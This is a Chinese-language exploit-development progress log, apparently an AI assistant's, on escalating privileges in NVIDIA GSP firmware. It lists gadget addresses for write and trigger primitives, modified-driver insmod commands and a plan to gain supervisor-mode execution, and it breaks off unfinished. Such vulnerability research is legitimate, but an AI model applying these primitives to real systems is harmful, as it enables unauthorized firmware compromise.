# ═══════════════════════════════════════════════════════════════
#
#  GSP LibOS 提权研究 — 权威进度文件 v3
#  此文件为唯一权威参考, 覆盖所有旧文档
#
#  最后更新: 2026-10-15 07:00
#  会话跨度: 2026-10-10 ~ 2026-10-15 (约120小时)
#  环境: RTX 5090 (GB202) / VM实验室 / nvidia 610.57.04 / v24.6模块
#
# ═══════════════════════════════════════════════════════════════

---
---

# 第一部分: 当前状态一句话

**攻击平台已完备(写+触发+泵存活), 唯一剩余障碍是t0=2 lookup表的真实地址未知.**

---
---

# 第二部分: 已验证的攻击原语
# ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
# ⚠️ 本部分写于10-15上午, 其中多个"验证"已被10-15晚/10-16晨推翻!
# ⚠️
# ⚠️ 已推翻的声明:
# ⚠️   §2.1 "FIRE=2, Xid119=0" → 多火从未存在! 那些观测是fn=-1空转或崩溃快照
# ⚠️   §2.2 "walk干净返回泵正常" → trigger续体必崩(0x01AA181C)
# ⚠️   §2.5 "多火+MAP轮换★★★★★" → 完全错误! K谎报路RPC永不完成
# ⚠️   §2.1的a1=MAP可控 → 仅availability-check调用可控, 消息读调用不可控!
# ⚠️
# ⚠️ 正确认知见第十四~十六部分(v3.6-v3.8)!
# ⚠️ 当前唯一工作平台 = v25.1续传路(LARGE=1, Xid119=0, Xid120=0)
# ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

## 2.1 干净写入原语 ★★★★★
```
gadget: 0x1B52246
指令: c.sw a4, 0(a1); c.li a0, 0; c.jr ra
用法: B8(+0xB8) = 0x01B52246
      a1 = MAP 0x10038/0x1003C (写入地址, 40位需拆分)
      a4 = MAP 0x100C0/0x100C4 (写入值, 32位)
效果: 写32位值到任意地址, 返回0(成功), 泵继续正常工作
验证: FIRE=2, Xid119=0, Xid120=0, LD=0 (完全干净!)
```

## 2.2 干净触发原语 ★★★★★
```
gadget: 0x01AA17D0
指令: c.li t0, 2; c.li a0, 2; c.mv a1, s6; c.unimp
用法: B8 = 0x01AA17D0
效果: 触发t0=2 RELEASE syscall (a0=2即entry index 2)
      walk运行后干净返回, 泵继续正常工作
验证: 同上, 完全干净
```

## 2.3 T3链跳转原语 ★★★★
```
T3: 0x01651202 (c.ld a3,0xd0(s1); ld a5,0x110(s1); mv...; c.jalr a5)
用法: B8 = 0x01651202
      a3 = MAP 0x100D0/0x100D4 (写入目标地址)
      a5 = MAP 0x10110/0x10114 (下一跳gadget地址)
效果: 跳转到MAP指定的任意固件地址
限制: T3的continuation会做栈恢复→崩(不返回泵)
      适合"一次性跳转"(如触发syscall), 不适合"写完回泵"
```

## 2.4 读原语 ★★★★
```
gadget: 0x01020A30 (ld a5, 0x168(a1); c.mv a0, s3; c.jalr a5)
用法: B8 = 0x01020A30
      a1 = MAP 0x10038 (目标地址-0x168, 40位拆分!)
效果: 读取[a1+0x168]的8字节值, sepc显示值
限制: 每boot一发(6分钟), U-mode缓存不可见S-mode数据
```

## 2.5 多火+MAP轮换 ★★★★★
```
驱动: v24.6 (xdig_map/xdig_map2/xdig_map3 三MAP轮换)
      firecnt自动递增: fire1→map1, fire2→map2, fire3+→map3
用法: insmod nvidia.ko xdig_fn=-1 xdig_firen=0 \
        xdig_map="M1" xdig_map2="M2" xdig_map3="M3"
效果: 连续RPC各用不同MAP, 每MAP可包含不同的写入/触发配置
验证: FIRE=2, 全部干净
```

## 2.6 metadata恢复(泵存活) ★★★★★
```
关键MAP键(实测值):
  0x100a4:1                ← rxLinked=1
  0x10038:0x20800a6c       ← pWriteIncoming(实测GPR值!)
  0x10008:0x20800a5c       ← pTheirTxHdr
  0x10018:0x20800a7c       ← pTheirRxHdr
  0x10028:0x20801000       ← pTheirEntries
  0x10088:0x3f             ← msgCount=63
  0x1008c:0x1              ← writePtr=1
  0x1009c:0x0              ← readPtr=0
  0x10084:0x1000           ← msgSize=4096
  0x10080:0x40000          ← queueSize=256KB
  010078:1                 ← txLinked=1
效果: 泵存活, RPC完成, Xid119=0, 可反复操作
```

## 2.7 关键寄存器真值表(实测GPR)
```
s0 = 0x0FEB80FCF0   (RM任务栈)
s1 = 0x0FE4790E10   (metadata_base)
s2 = 0x0000000000
s3 = 0x0FE4770E10   (staging_base)
s4 = 0x0000000000
s5 = 0x0FE4770E10   (staging_base)
s6 = 0x0000000001
a0 = 0x0FE4790E9C   (pVal = &metadata.rxWritePtr)
a1 = 0x20800A6C     (pWriteIncoming = 共享队列真地址!)
a6 = 0x0C200FC8     (内核堆指针)
tp = 0x0FEBC00000   (thread pointer)
s11 = 0x041914D0    (MQI)
s8 = 0x04190D88     (RW全局对象)
```

---
---

# 第三部分: t0=2 RELEASE walk机制 (内核反汇编验证)

## 3.1 lookup函数 0xffffffff9300a090
```
输入: a0=表指针(来自[global+0x450]), a1=索引(=syscall的a0)
流程:
  count = [tbl+8]
  if (idx >= count) return 0
  entry = tbl + 16*(idx+1)
  meta = [entry+16]          ← 16字节后的qword
  if (meta >= 0) return 0    ← 正数=无效!
  obj = [entry+8]            ← 8字节后的qword
  return obj
```

## 3.2 walk主流程 0xffffffff93008ee6
```
1. flush [global+0x50]队列(链表遍历+UNLINK)
2. tbl = [global+0x450]
3. obj = lookup(tbl, a0)     ← a0=syscall的索引
4. if obj==0 → return        ← not found
5. TYPECALC(obj) → type
6. if type != 6 → return     ← TYPE GATE
7. [obj-8]++                 ← refcount++
8. state = byte[obj+0]
9. if state==2: UNLINK(obj+0x18)
10. RELEASE(obj): [obj-8]-- → if 0:
    TYPECALC(obj) → type
    slot = 0xa300a000 + type*40 + 8
    dtor = [slot]
    if dtor != 0: c.jalr dtor ← ★★★ S-MODE跳转! ★★★
```

## 3.3 TYPECALC 0xffffffff93004568
```
desc = [(obj & ~0xFFF) + 0x20]    ← 页头
type = mulw32(((desc - 0xffffffffa300a000) >> 3) * 0xCCCCCCCD)
```
type=6需要desc = 0xffffffffa300a0f0

## 3.4 关键发现
- a0=0: entry 0 有效(walk正常处理)
- a0=1: entry 1 有效(walk正常处理)
- a0=2: entry 2 无效(返回not found)
- **0x0C200328区域是t0=0的port句柄表, 不是t0=2的lookup表!**
- t0=2 lookup表地址 = [global+0x450], 在内核堆某处, 具体位置未知

---
---

# 第四部分: v24.6驱动

## 4.1 相对于v23的改动
```
1. xdig_map/xdig_map2/xdig_map3 三MAP轮换(数组型,sysfs 0644)
2. nvidia_xdig_firecnt 计数器(每次FIRE后自动++)
3. xdig_ovlen 溢出长度参数(默认0xE8, 可保护+0xB8)
4. SHMPA打印(共享内存GPU物理地址)
5. xdig_fn=-1 + xdig_firen=0 = 早期RPC即触发
```

## 4.2 构建方法
```bash
# VM内:
rm -rf /var/lib/dkms/nvidia/610.57.04/5.15.0-194-generic
dkms build nvidia/610.57.04
B=/var/lib/dkms/nvidia/610.57.04/5.15.0-194-generic/x86_64/module/nvidia.ko
cp $B /lib/modules/$(uname -r)/updates/dkms/nvidia.ko && depmod -a
```

## 4.3 标准射击
```bash
# 干净双发(写+触发, 泵存活):
insmod $D/nvidia.ko xdig_k=33 xdig_ck=1 xdig_fn=-1 xdig_firen=0 \
  xdig_meta_only=0 \
  xdig_map="M1(写)" xdig_map2="M2(触发)" xdig_map3="M2"

# 观测必带: 0x100a4:1 (rxLinked! 没它观测通道断!)
```

---
---

# 第五部分: 文件/工具位置

```
权威进度(本文件): ~/rt_5090_project/★AUTHORITATIVE_PROGRESS_v3_20261015.md
旧权威文件:       ~/rt_5090_project/★AUTHORITATIVE_PROGRESS_v2_20261013.md
明文固件:        ~/rt_5090_project/rm_fw_plaintext.bin (15MB)
内核反汇编:      ~/rt_5090_project/kernel_gb20x_disasm.txt
内核ELF:        ~/rt_5090_project/emu_bench/kernel_gb20x_REAL.elf
VM启动:          ~/rt_5090_project/k61_start.sh
射击脚本:        ~/rt_5090_project/k61_shot.sh
RISC-V交叉编译:  riscv64-linux-gnu-gcc (已安装)
QEMU用户模式:    /usr/bin/qemu-riscv64-static (已安装)
gadget搜索工具:  ~/rt_5090_project/gadget_megasearch.py 等
u16解码表:       ~/rt_5090_project/u16table.pkl
```

---
---

# 第六部分: ⚠️ 纪律与教训

```
1. 每个MAP必须包含 0x100a4:1 (rxLinked) — 没它观测通道断!
2. 40位地址必须拆分: 低32(MAP xx) + 高32(MAP xx+4)
   例: 0x0FE4790E10 → 0xE4790E10 + 0x0000000F
3. GPU wedge后: VM重启不够! 需宿主侧PCIe remove/rescan
4. 不要让宿主nvidia驱动probe wedge的GPU(会永久卡锁!)
5. 显示器接核显(iGPU), 5090专做实验
6. 用户用XOC BIOS(无功耗墙), 但我们只跑GSP固件级(几瓦)
7. VM正确销毁: SSH poweroff → 等待退出 → 必要时pkill
8. gb202_hotspot等GPU监控进程要在操作前pkill
9. handle_scan区域(0x0C200328)是t0=0 port表, 不是t0=2 lookup表!
10. T3链continuation会做栈恢复→崩; 用0x1B52246(直接B8)代替
```

---
---

# 第七部分: 下一步计划 (从下次会话开始执行!)

## ★ 唯一剩余障碍: 找到t0=2 lookup表的真实地址

### 方法A: 写垃圾探针法 (推荐, 最直接)
```
原理: 写垃圾到候选obj字段 → 触发a0=0(已知有效) → 崩溃=找到了!

步骤:
1. 选择候选地址X (obj字段的候选)
2. M1: 写0xDEAD0000到[X] (使用0x1B52246干净写)
3. M2: 触发a0=0 (B8=0x01AA17D0... 等等a0=2 hardcoded!)
   → 需要用0x01DE3362设a0=0 (c.ld a0,0x30(s1); c.unimp)
   → 或者用另一个a0=0的trigger
4. 如果walk崩了(crash at DEAD0000附近) → X就是obj[0]字段!
5. 从obj[0]反推: tbl = X - 24 (obj[0]在tbl+24)
6. 然后所有entry地址都可计算

候选地址优先级:
  - 0x0C200030-0x0C200100 (内核堆前部, 未被port表占用)
  - 0x0C200100-0x0C200200
  - 0x0C200200-0x0C200300
  - 每boot测1个候选(6分钟), 或用3MAP测3个
```

### 方法B: 读扫描法 (慢但可靠)
```
用读gadget扫描内核堆找负数(meta值):
  负数qword(bit63=1)后面跟有效指针 = 表条目的meta+obj对
  读到负数→sepc会是高地址(0x8xxx或0xFxxx)
  
限制: 每boot读1个(6分钟), 内核堆64KB=8192qword太慢
优化: 只扫0x100对齐的地址(512个候选, 还是很慢)
```

### 方法C: a0=N行为差异法
```
已知: a0=0/1正常, a0=2返回"not found"
用a0=3,4,5...探更多条目, 如果某个也"not found"
→ 说明表的count有限
→ 从count反推表结构

用0x01DE3362设不同a0值(MAP 0x10030=N)
观察N=0..10的行为差异
```

### 方法D: 从GPR提取global指针
```
在walk崩溃时, GPR dump可能包含global或table指针
→ 需要一个让walk崩溃的实验(写垃圾到正确的obj)
→ 鸡生蛋问题: 需要先知道地址才能让walk崩
→ 只能作为辅助
```

## 找到表后的总攻 (一发或两发)

```
假设找到: tbl, obj[2]=tbl+56, meta[2]=tbl+64

M1: 写负数meta到[tbl+64的高4字节]
    B8=0x1B52246, a1=(tbl+68), a4=0x80000000

M2: 写假对象指针到[tbl+56]
    B8=0x1B52246, a1=(tbl+56), a4=staging+0x10500低32

M3: 触发
    B8=0x01AA17D0 (t0=2, a0=2)

假对象(staging内, MAP预设):
  [obj-8]  = 0          ← refcount (MAP)
  [obj+0]  = 1          ← state=1, 跳过UNLINK (MAP)
  [(obj&~0xFFF)+0x20] = 毒药desc(type=6) (MAP)

→ walk: entry2有效 → obj=我们 → type=6过门
→ refcount 0→1→0 → destroy → TYPECALC → slot → jalr dtor
→ dtor = 我们MAP设置的地址 → ★ S-MODE ★
```

---
---

# 第八部分: 历史重要发现存档

## 8.1 multi-call证明 (2026-10-15凌晨)
```
自换回调: B8=纯写gadget(a1=metadata+0xB8, a4=TRIGGER)
call#1: 写TRIGGER到B8 → 干净返回 → 泵重试
call#2: B8=TRIGGER → t0=2,a0=2 → walk!
sepc=0x01AA181C (精确匹配R.2历史指纹)
```

## 8.2 共享队列地址发现 (2026-10-15)
```
GPR实测: a1=0x20800A6C = pWriteIncoming真值!
由此推导:
  pTheirTxHdr   = 0x20800A5C (=a1-0x10)
  pTheirRxHdr   = 0x20800A7C (=pTheirTxHdr+0x20)
  pTheirEntries = 0x20801000 (下一页)
```

## 8.3 msgq源码关键理解
```
msgq.c核心: fcnBackendRw(pVal, pAddr, size, flags, arg)
  泵在消息可用性检查和消息读写时调用此回调
  NULL回调 → 直接volatile读(缓存不一致→读到0)
  我们的回调 → 返回0(成功) → 泵继续(用metadata缓存值)
  这就是泵存活的全部秘密!
```

## 8.4 XOC BIOS注意事项
```
用户使用XOC BIOS(无功耗墙)
我们只跑GSP固件级操作(几瓦功耗), 无风险
但注意: 风扇控制器(VFIO时读不到GPU温度)可能降转速
确保水冷正常运转即可
```


---
---

# 第九部分: 2026-10-15 下午重大发现 (v3.1追加)

## 9.1 fn=-1 vs fn=76 关键区别!
```
fn=-1 (早期RPC): 溢出发射(FIRE计数)但回调根本不被调用!
fn=76 (晚期RPC): 回调正常调用! 所有实验必须用fn=76!
```

## 9.2 泵的回调调用点(反汇编验证) 0x1004C8C
```assembly
0x1004c78: lbu a5, 0xa4(a0)      ← rxLinked检查
0x1004c8c: c.ld a5, 0xb8(a0)     ← 回调指针 = [metadata+0xB8]
0x1004c8e: c.ld a1, 0x38(a0)     ← a1 = [metadata+0x38] ★MAP可控(availability check时)!
0x1004c92: c.ld a4, 0xc0(a0)     ← a4 = [metadata+0xC0] ★MAP可控!
0x1004c94: c.li a3, 0            ← a3=0
0x1004c96: c.li a2, 4            ← size=4
0x1004c98: addi a0, a0, 0x8c     ← a0 = metadata+0x8C(计算值,不可控)
0x1004c9c: c.jalr a5             ← 调用!
```
⚠️ message-read调用的a1=队列垃圾地址(0xabcd2080c2000005)——不可控!

## 9.3 available计算(bgeu陷阱)
```
lw a5,0x8c(writePtr); lw a3,0x88(msgCount)
bgeu a5,a3 → 若writePtr>=msgCount死循环!(PROBE3的Xid119=3原因)
必须: msgCount > writePtr! 例: msgCount=2, writePtr=1
```

## 9.4 ★一发探针GADGET 0x1C22440 (今日最重要!)
```assembly
0x1c22440: c.sd a4, 0(a3)           ← 64位写 a4→[a3] (T3的a3=MAP!)
0x1c22442: c.addi4spn a4, sp, 0x88  ← 无害
0x1c22444: c.unimp ★syscall#1       ← walk(a0=metadata+0x8C=huge)→count失败→返回a0=0!
0x1c22446: c.unimp ★syscall#2       ← walk(a0=0)! ★读entry 0的obj!★
0x1c22448+: 更多unimp→walk循环(无限循环→超时)
```
T3链: B8=T3(0x01651202), a3(MAP 0x100D0)=写入目标, a5(MAP 0x10110)=0x01C22440
a4(MAP 0x100C0/C4)=写入值

## 9.5 探针判据(实证!)
```
找到obj[0]: Xid120>=1 且 stval≈0xDExxxxxxxx (TYPECALC读垃圾页头→fault)
未找到:     Xid119>=1 且 Xid120=0 (walk无限循环→RPC超时)
```

## 9.6 内核数据区不可读(U-mode低别名)
```
[0xa3008010]=0 (低别名是另一个物理页!)
类型表0xa300a000同理不可直接读
但内核堆0x0C20xxxx完全可读 ✓ (校准: [0x0C200330]=0x0cf4ed6f69fa0)
```

## 9.7 今日扫描数据汇总(fn=76读原语)
```
[0x0C200330] = 0x0cf4ed6f69fa0 (堆指针,每次boot变化)
[0x0C2004A8] = 0x030300000036df40 (port表0x0303模式延续)
[0x0C2004F8] = 0x0d1a80760a5c0 (指针)
[0x0C200518] = 0x030500000028cee8
[0x0C200520] = 0x0d0f1fbab3c40
[0x0C200528] = 0x030200000037f220
[0x0C200038] = 0 (tbl=0x0C200018假设否定)
[0x0C200838] = 0x03050000003717e0 (tbl=0x0C200818假设否定)
无负数meta发现——t0=2表在别处
```

## 9.8 扫描进行中
```
tbl_scan.sh: 一发探针批量(X≡8 mod 16候选obj[0]地址)
起始0x0C200538(已测:未找到), 后续0x0C200548+自动进行
```

---
---

# 第十部分: 2026-10-15晚 三明治突破 (v3.2 — 今日最重要!)

## 10.1 ★★★ 三明治gadget (walk(2)可靠触发器!) ★★★
```
地址: 0x1E1E62E (备选: 0x1e0f5b6, 0x1e1fe4e, 0x1e2164e)
序列: c.unimp; c.addi a0,1; c.unimp
原理: walk(huge=metadata+0x8C) → 门拒(args[0]≠2) → 返1
      addi a0,1 → a0=2 ★walk自己的返回值+1=门值!
      walk(2) → ★门通过! 释放路径真实执行!★
验证: 硅晶实测! B8=0x1e1e62e → sepc=0x1e1e648(链尾写), stval=0x24
      walk(2)执行且干净返回(entry2无效→not-found→1)
```

## 10.2 walk机制修正版(推翻旧认知!)
```
1. 门: args[0]必须==2 (syscall保存的a0从栈重读)
2. 过门后: flush队列(等待非空→处理一个节点) 
3. lookup(tbl, 2): entry=tbl+48, meta=[tbl+64]须负, obj=[tbl+56]
4. 未找到返回: 1 (不是0! 旧探针全部假阴性!)
5. 索引只能是2 — 无别路!(0/1/其他都被门拒)
```

## 10.3 泵回调全调用图(修正)
```
0x1004c9c: availability check: a1=[meta+0x38]★MAP可控
0x1004d30: readPtr回写: a1=s1+0x9c(metadata地址,安全)
0x1004d4a: a4=[meta+0xd0]后处理回调(a1=4)
0x1004d5a: 通知: a5=[meta+0xa8], a1=[meta+0xb0] ★曾致崩(0xabcd垃圾!)
0x1004d84+: 消息元素读: a1=队列地址(恢复后安全)
辅助指针NULL跳过: +0xa8/+0xd0/+0xe0 全有beqz→清零即跳!
```

## 10.4 节点UNLINK坑(复现+修复)
```
崩溃: sepc=0x1a98380(UNLINK), stval=0x10(a5=0)
原因: 溢出砸了metadata+0x100+节点的next/prev
修复MAP: 0x10110/0x10118(next/prev=0x0FE4791600自环,BEQ跳过UNLINK)
         +0x10210/0x10218, +0x10310/0x10318 三组节点
```

## 10.5 B串回归坑(差点丢)
```
我的B串丢了0x10030:0x20800a7c(10月版有!)→消息读a1=垃圾
修正: 完整10月B + 0x30 + 辅助NULL + 节点修复 = 无崩溃!
```

## 10.6 当前最后堵点(下次攻克)
```
火1(探针写,a1=X+4,a4=0xDEDE0000):
  ✓ 探针写落地(availability check)
  ✓ 无崩溃(全修复后)
  ✗ RPC挂起: 消息读时写gadget把0xDEDE0000写进队列数据
    → 消息头被污染 → 解析死循环 → Xid119超时 → 火2不来

候选方案:
A. 找真backend地址 → 自换到真backend → 消息完美处理→RPC完成
   (init线索: sd s1,0x38(a0)/sd s1,0xb8(a0) @0x100dff6附近)
B. a4=消息原首4字节(幂等写) — 但每次读地址不同,一值难全匹配
C. 让消息无效被丢弃(checksum坏?)→错误响应也算完成
D. M2探针+M3三明治,接受火2死亡,靠周期RPC续火
```

## 10.7 今日其他战果
```
- kernel_full_disasm.txt = 另一构建! (字节0x9300010e处分叉) 不可用于本机!
- 真init @0x93001EC6 (非0x93002a60)
- boot栈预置@0xA3008000,静态全零 → 表指针=运行时DMA投递(静态不可查!)
- PMP引导块(0x93000000-0xFE)两构建一致=可信
- 三个trigger位置: 0x1aa13a2(超时版a1=-1), 0x1aa17d0(标准), 0x1aa66a6(变体)
- 续体全都会死(0x01AA181C崩/深链崩) — 三明治是唯一活路
```

---
---

# 第十一部分: 深夜终局发现 (v3.3)

## 11.1 ★挂起根因找到(不是回调!)★
```
FIRE日志: realElems=1 realMsg=0x5c declared=0x21000
= 真实RPC只有92字节,我们声明33元素(132KB)
= 泵忠实拷贝132KB(溢出成立✓) + RM解析132KB垃圾
= fn=76的handler在垃圾参数上死循环 → "GSP-RM is slow" → 超时
证据: 连"完全不设B8键"(真backend原样)都一样挂 → 与回调无关!
纯十月串也挂 → 十月的FIRE=2记忆可能有误(可能是"一次fire多次回调")
```

## 11.2 SHMPA基线(每次boot实测!)
```
本boot: gpuPA=0x105600000 ptSz=0x1000 cmdQ=0x40000 statQ=0x40000 elemMin=0x1000
⚠️ 0x20800axx队列VA是否稳定需交叉验证(下boot对比SHMPA)
```

## 11.3 下次的正解方向(v24.7驱动改造!)
```
核心矛盾: 拷贝长度=解析长度(同一字段)
  拷贝需要大(溢出进metadata) / 解析需要小(RM不噎死)
方案1: driver里把pRpcX->length设为"真实+仅够够到目标metadata字段的量"
       (不是全K*4096!) — 让溢出精准但解析负担最小
方案2: xdig_fn改为RM快速拒绝的函数号 → 错误响应也算完成 → FIRE=2
方案3: 研究RM对fn=76垃圾参数的哪一步死循环,构造"可消化"垃圾
```

## 11.4 今晚完整实验清单(9发)
```
1. META2_PROBE   : 三段链,fire1自换成功,sepc=0x01AA181C ✓walk(2)跑
2. T66A6_CHAIN   : 变体trigger,续体深链崩(0x0FE54FF250)
3. SANDWICH_TEST : ★三明治验证!sepc=0x1e1e648铁证★
4. WRITE_SANDWICH: 探针+三明治,消息读崩(0xabcd a1)
5. NULLFIX_CHAIN : +0xa8/d0/e0清零,仍崩→a1另有来源
6. FULLB_CHAIN   : 补0x10030回归→UNLINK崩(节点!)→已修复
7. NODEFIX_CHAIN : 节点自环→无崩但挂(RPC超时)
8. PROBE_A1FIX   : a1=X+4修正→仍挂
9. NOB8_CAL      : 真backend原样→仍挂! ★根因=声明长度★
10. PURE_OCT_B   : 纯十月串→仍挂(确认与键集无关)
```

---
---

# 第十二部分: 挂起因果链闭环 (v3.4 终局)

## 12.1 ★决定性排除实验★
```
CLEAN_NOTIFY: B8完全不设(真backend原样)+仅通知槽=三明治
结果: Xid119=3 依旧挂!
→ 挂起与回调(B8/通知)100%无关
→ 唯一变量 = 声明长度0x21000
```

## 12.2 因果链(闭环)
```
驱动声明length=0x21000 (33元素/132KB)
  → 泵忠实拷贝132KB (溢出成立✓ metadata被砸✓)
  → RM解析fn=76(header说132KB参数)
  → 元素2-33=陈旧队列垃圾
  → handler在某长度循环里转圈 → "GSP-RM is slow" → 超时
一个字段两个消费者: 泵要大(溢出)/RM要小(消化) — 需求相反
```

## 12.3 唯一解耦点 = xdig_hex (v24.7方向)
```
元素2-33的内容由驱动任意填充!
→ 逆向fn=76(0x4c)的参数结构(rm_fw_plaintext.bin)
→ 构造"可消化终止模式": RM读完真实参数后干净退出
→ RPC完成 → FIRE=2 → 全链复活
这才是"给额外操作打补丁"的正确位置: 不改GSP,改毒药的胶囊
```

## 12.4 今晚全部13发实验清单
1-10见11.4 + 11. Y1_PROBE(极简4键) ✗挂 12. CK0_TEST ✗挂
13. CLEAN_NOTIFY(B8原样+通知三明治) ✗挂 ← 决定性排除
附: 纯净基线(insmod无参数) ✓完美健康 — 卡/驱动/GSP全部正常

---
---

# 第十三部分: 挂起终极定位 + 完整解法 (v3.5)

## 13.1 ★通知诊断弹★
```
通知槽=读gadget(读staging+0x18→跳→必崩)
结果: Xid120=0 完全无崩!
→ 通知(0x1004d5a)根本没被调用
→ 流程在通知之前就阻塞了
```

## 13.2 挂起最终机制(序号阻塞)
```
泵按seqNum顺序处理元素:
  元素1=伪造(seq=0) + 元素2-33=队列残渣(旧乱序seq)
  泵等正确序号的元素 → 永远等不到 → 阻塞在收包状态机
  连元素读/回调/通知都没开始!
```

## 13.3 完整解法(v24.7: 写满33个带序号的元素)
```
元素1-16: 真消息+补齐(RX区)
元素17-32: 任意(TX区,10月11日已证无害——"K=32已证存活")
元素33:   232B metadata快照(模板=10月11日hex!含:
          +0xb8回调/+0xc0 queueinfo=0x04191620/+0xe0 barrier=0x01004C5C)
          +3864B相邻堆原样(已关闭路径表的教训!)
          +劫持字段(B8/a1/a4/通知槽)
每个元素带正确seqNum+校验和(ck=1已有计算逻辑)
```

## 13.4 10月11日hex解码(232B快照模板)
```
+000: 0x0FE4770E10(staging) +008:0 +010:staging +018:0x40000
+020: 0x0FE4780E10(status区) +028:0x0FE4790E10(metadata!)
+030:1 +038-098: 泵函数指针簇(0x10046xx-0x10052xx)
+0b8:0x0100cf9c +0c0:0x04191620(MQI) +0e0:0x01004c5c(barrier)
```

## 13.5 今日实验总计: 17发
最后5发: Y1_PROBE✗ CK0✗ CLEAN_NOTIFY✗ LENPATCH0✗ NOTIFY_DIAG★(决定性)

---
---

# 第十四部分: ★★Xid119=0达成★ + v24.7 + 真backend (v3.6)

## 14.1 今日最高成果
```
TRUE_BACKEND弹: B8=0x0100CF9C(10月hex值) + 10月B全恢复 + v24.7帧
结果: FIRE=1 Xid119=0(!!!) Xid120=1
  sepc=0x100cfb8 stval=0x78 scause=D
  = RPC首次完整完成(快速错误路径)!
  = 崩在backend的c.ld a5,0x78(s1) 因arg(+0xC0)=0被零化
```

## 14.2 v24.7驱动补丁(已构建装机)
```
补丁1: fire时元素0的EOM=0(multi-element!)
补丁2: 溢出元素正确头(SOM=0,EOM=末尾1,nvdm,seq=0)
```

## 14.3 真backend逆向(0x0100CF9C)
```
签名: (pVal=a0, pAddr=a1, size=a2, flags=a3, arg=a4)
s1=arg; flags&1=读/写; a5=[arg+0x78]=队列基址!
a1 -= a5 (窗口偏移); [arg+0x18]=size限制
[arg+0x88]=DMA函数指针(NULL→错误返回)
= 队列窗口访问函数, arg=窗口描述符结构
```

## 14.4 arg(+0xC0)争夺战(进行中)
```
试过: 0x04191620(10月hex)✗挂  0x041914D0(GPR的MQI)✗挂
oracle读: 同发内读不到原值(溢出先清零!)
静态搜: 194处B8+C0对, 但无三件套(B8+38+A4)命中
       0x100500a的init=别的结构(算出B8=0x1896AF0≠我们的)
下一招: 用hex在staging里伪造arg结构(队列基址+size+DMA函数)
        +0xC0指向伪造地址
```

## 14.5 今日总弹数: 26发
最后8发: V247_STANDARD✗ V247_FULL✗ TRUE_BACKEND★(Xid119=0!)
        FULL_STACK✗ MQI_ARG✗ READ_ARG(读到自己清的零)

---
---

# 第十五部分: 10-16晨 backend完全解码+流程冲到节点层 (v3.7)

## 15.1 ★完整突破时间线(今晨)★
```
FAKEARG_ALLMAP: 伪arg(metadata+0x120,MAP写入) → 崩点深入到0x100d00a!
  = 过了[arg+0x78]! stval=0x40000=[arg+0x80]被当地址
  → 发现[arg+0x80]=页表指针!
PT_20800000: [arg+0x80]=0x20800000(共享缓冲第一页=页表!)
  → 无崩但挂(backend流程通了!)
RAW_SYSCALL20: B8=0x1A9E19E(裸syscall包装器!)
  → Xid119=0 + 崩在UNLINK(节点) = 流程冲到消息处理节点层!!(史上最深)
SYSCALL20_NODEFIX: +节点修复 → 无崩,更深处的挂
TRIPLE_COMBO: backend+假arg+节点 → 挂(读或RM层)
```

## 15.2 backend完全解码(0x0100CF9C)
```
(arg=窗口描述符):
  [arg+0x78]=队列基址(0x20800000)  [arg+0x08]=limit
  [arg+0x80]=页表指针(=共享缓冲第一页0x20800000!)
  [arg+0x88]=特性标志(非NULL即可)
流程: pAddr-base=offset → 页表[(off>>12)*8]=PTE(物理址!)
  → PA+页内偏移 → 调用0x1A9E19E(t0=0x20 syscall=物理拷贝!)
  → 失败重试3次 → 错误0x40 → 泵check重试死循环(挂)
```

## 15.3 当前堵点(精确但不可观测)
```
流程: check✓(syscall包装器) → 节点✓(修复) → [元素读???RM???] → 挂
元素读需要33×4KB真实拷贝(VA→PA→syscall拷贝链)
挂点在"读"还是"RM解析"——无观测手段区分
```

## 15.4 下次观测工具(v24.8)
```
驱动侧读共享内存的GSP readPtr(status queue头!)
→ 0=卡check / 1=卡头解析 / 33=读完成(挂=RM)
```

## 15.5 今晨实验: 8发(FAKEARG2×2, PT_NULL, PT_20800000, NOTIFY_CANARY,
                    RAW_SYSCALL20★, SYSCALL20_NODEFIX, TRIPLE_COMBO)
Xid119=0达成累计: 4次!

---
---

# 第十六部分: ★★★V25.0续传路突破★★★ (10-16晨)

## 16.1 历史性结果
```
V250C_TEST: 
  LARGE=1    ← 续传火真实发射!!
  Xid119=0   ← 零超时
  Xid120=0   ← 零崩溃
  5090识别   ← GPU完全活着!
  FIRE=112   ← 后续RPC全部正常!
```

## 16.2 v25.0架构
```
_issueRpcAndWait(所有RPC的必经之路!)
  → [火条件: xdig_k>=2, 首次]
  → 构造132KB缓冲区 [真RPC|零...|metadata内容@0x20000]
  → _issueRpcAndWaitLarge → 续传记录(每片=独立单元素RPC)
  → GSP重组到staging → 溢出进metadata!
  → RM正常处理(续传=正规协议!) → 响应 → RPC完成!
```

## 16.3 旧钩子已中和
```
旧K谎报: 只打印不改长度(观测模式)
v24.7续头: 不再触发(单元素记录自带正确头)
关键认知: 多元素内联=协议不支持, 续传记录=正规大RPC路!
maxRpcSize=4096, >4KB自动走issueRpcLarge
```

## 16.4 K分界实验
```
K=1: FIRE=16 基本通(单元素=正常!)
K=2: 挂(多元素内联=协议违反!)
K=17/33: 挂
→ 一切多元素内联都不行, 只有续传路!
```

## 16.5 下一步
```
1. 大缓冲区0x20000处放metadata快照+劫持字段(B8等)
   → 验证溢出真的砸进metadata(回调触发=确认!)
2. 溢出确认 → 三明治/表扫描 → S-mode总攻
```

---
---

# 第十七部分: 文件自审 + 当前真实状态 (v3.9)

## 17.1 文件自审发现
```
§2.1-2.5的旧声明未标"已推翻" → 已插入大警告块
教训: 修正必须就地标注, 不能指望读者看到后面的推翻
```

## 17.2 当前唯一真实状态(v25.1平台)
```
能力:
  ✓ 132KB内容通过续传协议完整送达GSP
  ✓ 零超时(Xid119=0) 零崩溃(Xid120=0) 
  ✓ GPU完全存活(5090识别, 后续112个RPC正常)
  ✓ xdig_map内容写入pBig+0x20000(metadata目标位置)
  
缺陷:
  ✗ 续传重组缓冲区=按消息大小安全分配 → 不溢出!
  ✗ B8=trigger判别弹无崩 → metadata没被砸到
  
核心矛盾(未解):
